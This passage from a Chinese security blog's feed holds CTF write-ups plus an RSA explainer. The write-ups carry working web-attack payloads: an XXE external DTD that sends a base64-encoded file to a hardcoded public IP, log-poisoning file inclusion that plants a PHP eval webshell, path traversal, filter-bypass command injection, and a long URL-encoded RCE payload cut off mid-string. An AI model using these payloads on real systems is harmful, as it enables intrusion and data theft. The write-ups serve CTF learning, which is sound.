highlight_file(__FILE__);&#125;?&gt;</code></pre><p>图片链接为<code>/showImage.php?image=Z6Ilu83MIDw=</code></p><p>可以看到图片文件名是<code>Z6Ilu83MIDw=</code>经过<code>bf-ecb</code>算法用<code>$key</code>得到的，再看<code>$key</code>的生成方式</p><pre class="language-php" data-language="php"><code class="language-php">substr(md5(&#39;ctfshow&#39;.rand()),3,8);</code></pre><p>查询<code>rand()</code>函数，若里面的参数为空，则返回<code>0</code>到<code>getrandmax()</code>之间的伪随机整数</p><p><code>getrandmax()</code>函数返回随机数可能返回的最大值，既然有上限即可进行爆破来得出<code>key</code>值</p><p>脚本如下：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    for($i&#x3D;0;$i&lt;getrandmax();$i++)&#123;        $key &#x3D; substr(md5(&#39;ctfshow&#39;.$i),3,8);  &#x2F;&#x2F;5a78dbb4        $image&#x3D;&quot;Z6Ilu83MIDw&#x3D;&quot;;        $str &#x3D; openssl_decrypt($image, &#39;bf-ecb&#39;, $key);        if(strpos($str,&quot;gif&quot;) or strpos($str,&quot;jpg&quot;) or strpos($str,&quot;png&quot;))&#123;            print($str.&quot;\n&quot;);            print($i.&quot;\n&quot;);            print($key.&quot;\n&quot;);            break;        &#125;    &#125;    $flag &#x3D; openssl_encrypt(&#39;config.php&#39;, &#39;bf-ecb&#39;, &#39;5a78dbb4&#39;);    print($flag);</code></pre><p>得到<code>N6bf8Bd8jm0SpmTZGl0isw==</code>，为<code>config.php</code>加密后的<code>base64</code>码，访问<code>/showImage.php?image=N6bf8Bd8jm0SpmTZGl0isw==</code>，F12打开复制代码base64解密得到<code>config.php</code>的内容，<code>flag</code>即在其中。</p><h3 id="Web4-观心"><a href="#Web4-观心" class="headerlink" title="Web4_观心"></a>Web4_观心</h3><p>抓包发现有<code>api.php</code>文件，并且带有请求<code>api</code>和<code>city</code>两个数据</p><p><code>api</code>携带的是一个网址，是一个xml文件，由此判断考的应该是XXE外部实体注入</p><p>于是构建攻击环境</p><p>在公网服务器上编写两个文件</p><p>xxe.xml</p><pre class="language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token doctype">&lt;!DOCTYPE root[&lt;!ENTITY % dtd SYSTEM "http://ip/xxe.dtd">%dtd;]></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span>woojay<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pass</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pass</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span></code></pre><p>xxe.dtd</p><pre class="language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flag.txt&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;47.106.160.176:5000&#x2F;%file;&#39;&gt;&quot;&gt;%int;%send;</code></pre><p>随后在服务器上监听5000端口，即可得到<code>flag.txt</code>的 <code>base64</code>编码后的结果，解码既是flag</p><p>不监听端口也可以，直接发包请求，会把报错的结果返回，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/CTFSHOW-WEB_AK%E8%B5%9B/image-20200804113715125.png" alt loading="lazy"></p><p>XXE这块不是很了解，原理后面再仔细研究一下</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在菜鸡的道路上越走越远。。。淦！&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://www.extrader.top/categories/CTF/"/>
    
    
      <category term="CTF题" scheme="https://www.extrader.top/tags/CTF%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>RSA算法浅析</title>
    <link href="https://www.extrader.top/posts/aa76c91b/"/>
    <id>https://www.extrader.top/posts/aa76c91b/</id>
    <published>2020-08-01T14:08:36.000Z</published>
    <updated>2020-08-11T13:13:09.922Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数论知识"><a href="#数论知识" class="headerlink" title="数论知识"></a>数论知识</h3><ol><li><p><strong>互质</strong>：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，14 和 15 互质。注意，两个数构成互质关系，他们不一定需要是质数，比如 7 和 9。</p></li><li><p><strong>欧拉函数</strong>：用于计算任意正整数 <code>n</code>，在 <code>&lt;=n</code> 的正整数中，与 <code>n</code> 互质的正整数个数。</p></li><li><p><strong>欧拉定理</strong>：如果两个正整数 a 和 n 互质，则如下等式成立。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173237556.png" alt loading="lazy"></p></li><li><p><strong>费马小定理</strong>：欧拉函数中的一个特殊情况，如果  <code>n</code>  是质数，而 <code>a</code> 不是 <code>n</code> 的倍数，此时 <code>a</code> 和 <code>n</code> 必然互质。因为<code>n</code>的欧拉函数值 = <code>n-1</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801173548812.png" alt loading="lazy"></p></li><li><p><strong>模反元素</strong>：如果两个正整数 <code>a</code> 和 <code>n</code> 互质，那么一定可以找到一个正整数 <code>b</code>，使得 <code>ab - 1</code> 被 <code>n</code> 整除。这个时候，<code>b</code> 就叫做 <code>a</code> 的 模反元素。</p></li></ol><h3 id="关键参数"><a href="#关键参数" class="headerlink" title="关键参数"></a>关键参数</h3><p><code>(e,n)</code>：公钥</p><p><code>(d,n)</code>：私钥</p><p><code>p,q</code>：<code>n=p*q</code> ，<code>p</code>和<code>q</code>都是两个大素数</p><p><code>c</code>：密文</p><p><code>m</code>：明文</p><p><code>n,e</code>是公开的情况下，想要知道<code>d</code>的值，必须要将<code>n</code>分解计算出<code>n</code>的欧拉函数值，而<code>n</code>是两个大素数<code>p，q</code>的乘积，将其分解是困难的。</p><h3 id="生成密钥"><a href="#生成密钥" class="headerlink" title="生成密钥"></a>生成密钥</h3><p>取两个大质数<code>p,q</code>，并计算他们的乘积<code>n</code>，一般要求<code>n</code>换算成二进制要大于2048位</p><p>则根据欧拉定理满足以下条件（欧拉函数）：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172139842.png" alt loading="lazy"></p><p>计算<code>n</code>的欧拉函数值</p><p>选择一个数<code>e</code>使得<code>e</code>与<code>n</code>的欧拉函数值互质，一般选择65537</p><p>计算<code>e</code>相对<code>n</code>的欧拉函数值的模反元素<code>d</code>，因为<code>e</code>与<code>n</code>的欧拉函数值互质，则根据模反元素的性质</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801172706077.png" alt loading="lazy"></p><p>根据扩展欧几里得算法，通过迭代求解即可解出<code>d</code>，随后即生成公钥<code>(e,N)</code>，私钥<code>(d,N)</code></p><h3 id="加解密的实现"><a href="#加解密的实现" class="headerlink" title="加解密的实现"></a>加解密的实现</h3><p>加密：</p><p><code>m</code>为要加密的信息，<code>(e,n)</code>组合起来为公钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211116338.png" alt loading="lazy"></p><p>解密：</p><p><code>m</code>为要解密的信息，<code>(d,n)</code>组合起来为私钥，<code>c</code>和<code>k</code>分别为常数</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/RSA%E7%AE%97%E6%B3%95%E6%B5%85%E6%9E%90/image-20200801211144409.png" alt loading="lazy"></p><p>两个公式可相互推导</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;数论知识&quot;&gt;&lt;a href=&quot;#数论知识&quot; class=&quot;headerlink&quot; title=&quot;数论知识&quot;&gt;&lt;/a&gt;数论知识&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;互质&lt;/strong&gt;：如果两个正整数，除了 1 以外没有其他的公因数，则他们互质。比如，
      
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>36D杯五道代码审计题</title>
    <link href="https://www.extrader.top/posts/e53b958d/"/>
    <id>https://www.extrader.top/posts/e53b958d/</id>
    <published>2020-06-03T16:00:00.000Z</published>
    <updated>2020-07-14T12:52:02.630Z</updated>
    
    <content type="html"><![CDATA[<p>“温故而知新，可以为师矣”——孔子《论语》</p><a id="more"></a><h3 id="WEB-ALL-INFO-U-WANT"><a href="#WEB-ALL-INFO-U-WANT" class="headerlink" title="WEB_ALL_INFO_U_WANT"></a>WEB_ALL_INFO_U_WANT</h3><p>访问<code>index.php.bak</code>得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">visit all_info_u_want.php and you will get all information you want&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:&lt;?phperror_reporting(0);&#x2F;&#x2F;give you all information you wantif (isset($_GET[&#39;all_info_i_want&#39;])) &#123;    phpinfo();&#125;if (isset($_GET[&#39;file&#39;])) &#123;    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];    &#x2F;&#x2F;really baby include    include($file);&#125;?&gt;really really really baby challenge right? </code></pre><p>根据源码提示传入<code>all_info_u_want.php?all_info_i_want</code>，得到<code>phpinfo()</code>的结果，<code>flag</code>并不在这里</p><p>传入<code>all_info_u_want.php?file=../../../../../../etc/passwd</code>，可以看到<code>/etc/passwd</code>的内容，目录穿越，再传入<code>all_info_u_want.php?file=../../../../../../flag</code>试图读取flag，得到信息如下：</p><p><code>flag&#123;this_is_fake_flag_realflag_is_in_/etc_find_it_by_yourself&#125;</code></p><p>根据提示可以知道flag应该在<code>etc</code>目录下，慢猜不好搞，没那个运气</p><p>先来看看用的是什么web服务器，抓包可以看到是<code>Nginx</code>服务器，尝试读取<code>Nginx</code>的敏感信息文件，网上查得<code>Nginx</code>的访问日志文件默认路径为<code>/var/log/nginx/access.log</code>，尝试读取，得到日志文件结果，该日志文件回保存访问的<code>User-Agent</code>的内容，结合文件包含，我们可以在<code>User-Agent</code>中注入恶意代码，从而<code>getshell</code>，</p><pre class="language-none"><code class="language-none">GET &#x2F;all_info_u_want.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log HTTP&#x2F;1.1Host: 16636aaf-35bc-4ac1-993c-95897de4ec8e.chall.ctf.showUser-Agent: &lt;?php phpinfo();?&gt;</code></pre><p>成功执行php代码，于是传入<code>User-Agent: &lt;?php eval($_POST[&#39;pass&#39;]);?&gt;</code></p><p>利用pass反弹shell后执行<code>find etc -name &quot;*&quot; | xargs grep &quot;flag&#123;&quot;</code>，得到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge"></a>WEB_WUSTCTF朴实无华Revenge</h3><p>拿到题目得到源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);  &#x2F;&#x2F; 获取变量的整数值    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    $numReverse &#x3D; intval(strrev($num));  &#x2F;&#x2F; 反转字符串    if (preg_match(&#39;&#x2F;[^0-9.-]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num))&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧1&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>先一层层绕过，首先第一个<code>if</code>，传入num，简单来说就是</p><ul><li>num结果取整后和原来的字符串需要相等，但是这里只需要<code>==</code>即可</li><li>num需要为数字，取整后的数字不能小于-999999999999999999或者大于999999999999999999</li><li>num在经过取整和反转字符串后取整后的数字需要相等</li><li>num经过<code>isPalindrome</code>函数返回的值需要为<code>false</code></li></ul><p>再来看看<code>isPalindrome</code>函数，字符串两边对称的数字需要有不一样，才能使<code>$l=0</code>，返回<code>false</code>这样与前面的条件就矛盾了，反转后又需要相等，又不能对称。</p><p>以下提供两种绕过方式：</p><pre class="language-none"><code class="language-none">00.01000000000000000.00000000000000010</code></pre><p>第一种确实是没有任何操作就直接绕过了，而第二种则是浮点数的精度问题，在服务器上</p><p><code>var_dump(intval(1000000000000000.00000000000000010) === intval(strrev(1000000000000000.00000000000000010)));</code></p><p>是可以返回true的，但是我在本地测试到</p><p><code>var_dump(intval(1000000.00000010) === intval(strrev(1000000.00000010)));</code></p><p>就返回false了，不知道什么鬼-.-</p><p>再绕过第二个if</p><p>这个需要让<code>$md5==md5(md5($md5))</code>，弱比较，绕如果md5=0exxxxxxxx，经过两次md5加密后的md5值也为0exxxxxxxx，即可绕过</p><p>写个脚本爆破即可，这样的字符串挺多的，以下列举几个：</p><pre class="language-none"><code class="language-none">0e3900184182-&gt;0e1418721190302697727652753637950e6201668706-&gt;0e7985422574949326206502419486330e6702291282-&gt;0e1005063503807650968114418218160e1808236718-&gt;0e9355671365452205537103932527520e9507776345-&gt;0e8846062744707241436539484045430e7208324299-&gt;0e0296373600831971546521412019920e2010692162-&gt;0e5148989988791743362037461270580e9410970854-&gt;0e4302790236499053907065604760830e3511282263-&gt;0e657335831331991043075342997270</code></pre><p>再到最后get flag</p><p>过滤了挺多的命令，但是还是可以绕过：</p><pre class="language-shell" data-language="shell"><code class="language-shell">nl&lt;&#x2F;flag|nlrev&lt;&#x2F;flag|rev</code></pre><p>随后即可拿到flag</p><h3 id="WEB-WUSTCTF朴实无华Revenge-Revenge"><a href="#WEB-WUSTCTF朴实无华Revenge-Revenge" class="headerlink" title="WEB_WUSTCTF朴实无华Revenge_Revenge"></a>WEB_WUSTCTF朴实无华Revenge_Revenge</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpheader(&#39;Content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123;    $len&#x3D;strlen($str);    $l&#x3D;1;    $k&#x3D;intval($len&#x2F;2)+1;    for($j&#x3D;0;$j&lt;$k;$j++)        if (substr($str,$j,1)!&#x3D;substr($str,$len-$j-1,1)) &#123;            $l&#x3D;0;            break;        &#125;    if ($l&#x3D;&#x3D;1) return true;    else return false;&#125;&#x2F;&#x2F;level 1if (isset($_GET[&#39;num&#39;]))&#123;    $num &#x3D; $_GET[&#39;num&#39;];    $numPositve &#x3D; intval($num);    $numReverse &#x3D; intval(strrev($num));    if (preg_match(&#39;&#x2F;[^0-9.]&#x2F;&#39;, $num)) &#123;        die(&quot;非洲欢迎你1&quot;);    &#125; else &#123;        if ( (preg_match_all(&quot;&#x2F;\.&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num) &gt; 1) || (preg_match_all(&quot;&#x2F;\-&#x2F;&quot;, $num)&#x3D;&#x3D;1 &amp;&amp; !preg_match(&#39;&#x2F;^[-]&#x2F;&#39;, $num))) &#123;            die(&quot;没有这样的数&quot;);        &#125;    &#125;    if ($num !&#x3D; $numPositve) &#123;        die(&#39;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#39;);    &#125;    if ($numPositve &lt;&#x3D; -999999999999999999 || $numPositve &gt;&#x3D; 999999999999999999) &#123; &#x2F;&#x2F;在64位系统中 intval()的上限不是2147483647 省省吧        die(&quot;非洲欢迎你2&quot;);    &#125;    if( $numPositve &#x3D;&#x3D;&#x3D; $numReverse &amp;&amp; !isPalindrome($num) )&#123;        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;&#x2F;br&gt;&quot;;    &#125;else&#123;        die(&quot;金钱解决不了穷人的本质问题&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;level 2if (isset($_GET[&#39;md5&#39;]))&#123;    $md5&#x3D;$_GET[&#39;md5&#39;];    if ($md5&#x3D;&#x3D;md5(md5($md5)))        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;&#x2F;br&gt;&quot;;    else        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;&#x2F;&#x2F;get flagif (isset($_GET[&#39;get_flag&#39;]))&#123;    $get_flag &#x3D; $_GET[&#39;get_flag&#39;];    if(!strstr($get_flag,&quot; &quot;))&#123;        $get_flag &#x3D; str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);        $get_flag &#x3D; str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);        if (preg_match(&quot;&#x2F;[&#39;\*\&quot;[?]&#x2F;&quot;, $get_flag)) &#123;            die(&#39;非预期修复*2&#39;);        &#125;        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;&#x2F;br&gt;&quot;;        system($get_flag);    &#125;else&#123;        die(&quot;快到非洲了&quot;);    &#125;&#125;else&#123;    die(&quot;去非洲吧&quot;);&#125;?&gt;</code></pre><p>这题和上题差不多，只是最后的命令多过滤了一些，直接给出payload：</p><pre class="language-none"><code class="language-none">?num&#x3D;1000000000000000.00000000000000010&amp;md5&#x3D;0e2010692162&amp;get_flag&#x3D;ca\t&lt;flag.ph\p</code></pre><h3 id="WEB-你取吧"><a href="#WEB-你取吧" class="headerlink" title="WEB_你取吧"></a>WEB_你取吧</h3><p>源码：</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);show_source(__FILE__);$hint&#x3D;file_get_contents(&#39;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;hhh.php&#39;);$code&#x3D;$_REQUEST[&#39;code&#39;];$_&#x3D;array(&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;l&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;\~&#39;,&#39;\^&#39;);$blacklist &#x3D; array_merge($_);foreach ($blacklist as $blacklisted) &#123;    if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $code)) &#123;        die(&#39;nonono&#39;);    &#125;&#125;eval(&quot;echo($code);&quot;);?&gt;</code></pre><p>直接给出P神的payload(无字母数字的RCE)：</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>GET：</p><pre class="language-php" data-language="php"><code class="language-php">?code&#x3D;%22%22%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%5f%3d%24%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%3d%24%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f